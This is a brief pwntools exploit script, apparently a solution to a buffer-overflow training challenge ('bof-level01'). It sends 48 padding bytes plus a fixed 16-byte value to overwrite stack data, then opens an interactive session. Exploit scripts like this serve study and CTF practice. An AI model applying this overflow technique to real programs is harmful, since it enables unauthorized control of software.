from pwn import *

# context.terminal = ['tmux', 'splitw', '-h']

target = process("./bof-level01")

# gdb.attach(target, gdbscript="b *receive_input")

target.sendline(b"A" * 48 + b"abcdefghABCDEFGH") 

target.interactive()
